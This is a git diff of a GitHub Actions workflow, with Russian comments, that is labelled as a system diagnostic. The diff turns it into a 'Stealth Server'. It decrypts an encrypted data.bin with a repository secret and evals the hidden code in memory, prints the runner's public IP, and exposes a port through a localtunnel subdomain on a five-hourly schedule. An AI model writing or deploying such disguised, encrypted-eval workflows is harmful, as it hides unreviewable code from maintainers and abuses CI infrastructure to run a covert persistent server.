@@ -1,29 +1,34 @@
 name: System_Diagnostic_Core
 
 on:
+  workflow_dispatch:      # Кнопка ручного запуска в Actions
   schedule:
-    - cron: '0 */5 * * *'
-  workflow_dispatch:
+    - cron: '0 */5 * * *' # Авто-перезапуск каждые 5 часов
 
 jobs:
   service-runtime:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
-      - name: Environment Setup
+      - name: Install Dependencies
         run: npm install peer localtunnel
 
-      - name: Start System Process
+      - name: Start Stealth Server
         env:
+          # Твой секретный ключ из Settings -> Secrets
           CORE_ACCESS_TOKEN: ${{ secrets.MASTER_KEY }}
         run: |
-          # Расшифровка и запуск в фоновом режиме
+          echo "--- ТВОЙ ПАРОЛЬ (IP СЕРВЕРА) НИЖЕ ---"
+          curl -s ifconfig.me
+          echo -e "\n------------------------------------"
+          
+          # Расшифровка data.bin и запуск server.js прямо в памяти
           node -e "const c=require('crypto'),fs=require('fs');const d=fs.readFileSync('data.bin'),s=d.slice(0,16),i=d.slice(16,32),e=d.slice(32),k=c.pbkdf2Sync(process.env.CORE_ACCESS_TOKEN,s,100000,32,'sha256'),p=c.createDecipheriv('aes-256-cbc',k,i);let r=p.update(e);r=Buffer.concat([r,p.final()]);eval(r.toString());" &
           
+          # Ожидание загрузки ноды
           sleep 15
-          # Замени 'my-secure-mesh-node' на свой уникальный адрес
-          npx lt --port 9000 --subdomain my-secure-mesh-node &
           
-          echo "System diagnostic running..."
-          sleep 20000
+          # Запуск туннеля. Замени subdomain на свой уникальный!
+          npx lt --port 9000 --subdomain my-secure-mesh-node
